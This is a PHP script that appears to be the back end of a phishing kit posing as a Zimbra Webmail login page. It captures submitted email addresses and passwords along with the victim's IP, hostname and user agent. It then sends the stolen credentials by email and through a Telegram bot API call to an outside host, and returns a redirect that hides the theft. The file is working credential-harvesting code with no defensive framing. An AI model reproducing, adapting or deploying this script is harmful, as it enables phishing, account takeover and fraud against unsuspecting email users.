<?php
require_once 'email.php';
require_once 'telegram.php';

// Input validation and sanitization
$email = filter_input(INPUT_POST, 'di', FILTER_SANITIZE_EMAIL);
$password = filter_input(INPUT_POST, 'pr', FILTER_SANITIZE_STRING);

// Check if inputs are valid
if (!empty($email) && !empty($password)) {
    // Get client information
    $ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $hostname = gethostbyaddr($ip) ?: 'Unknown';
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    // Build message using heredoc for better readability
    $message = <<<EOT
|-----------|Zimbra Webmail|------------|
Email: {$email}
Password: {$password}
|-----------------------|
Client IP: {$ip}
GeoIP: http://www.geoiptool.com/?IP={$ip}
User Agent: {$userAgent}
|-----------------------|
EOT;

    // Email Configuration
    $subject = "Login Attempt: {$ip}";
    $Receive_email = getenv('RECEIVER_EMAIL'); // Retrieve receiver email from environment variables

    // Send email
    if (!empty($Receive_email) && filter_var($Receive_email, FILTER_VALIDATE_EMAIL)) {
        mail($Receive_email, $subject, $message);
    } else {
        error_log("Environment variable RECEIVER_EMAIL is missing or invalid.");
    }

    // Telegram Notification
    $botToken = getenv('TELEGRAM_BOT_TOKEN'); // Retrieve Telegram bot token from environment variables
    $id = getenv('TELEGRAM_CHAT_ID'); // Retrieve Telegram chat ID from environment variables

    if (!empty($botToken) && !empty($id)) {
        $encodedMessage = urlencode($message);
        $telegramUrl = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$id}&text={$encodedMessage}";
        
        try {
            $curl = curl_init();
            curl_setopt_array($curl, [
                CURLOPT_URL => $telegramUrl,
                CURLOPT_SSL_VERIFYPEER => false, // Disable SSL verification (if needed)
                CURLOPT_RETURNTRANSFER => true, // Return response instead of outputting
                CURLOPT_TIMEOUT => 10 // Prevent hanging
            ]);

            $result = curl_exec($curl);

            if (!$result || curl_errno($curl)) {
                error_log("Telegram API error: " . curl_error($curl));
            }

            curl_close($curl);
        } catch (Exception $e) {
            error_log("Telegram exception: " . $e->getMessage());
        }
    } else {
        error_log("Environment variables for Telegram are missing or invalid.");
    }

    // Frontend Response
    header('Content-Type: application/json');
    echo json_encode([
        'success' => true,
        'message' => 'Notification sent successfully',
        'redirectUrl' => 'https://dashboard.example.com' // Replace with proper URL
    ]);
    exit();
} else {
    // Handle invalid inputs
    header('Content-Type: application/json');
    echo json_encode([
        'success' => false,
        'message' => 'Invalid input: Email or Password missing'
    ]);
    exit();
}
?>
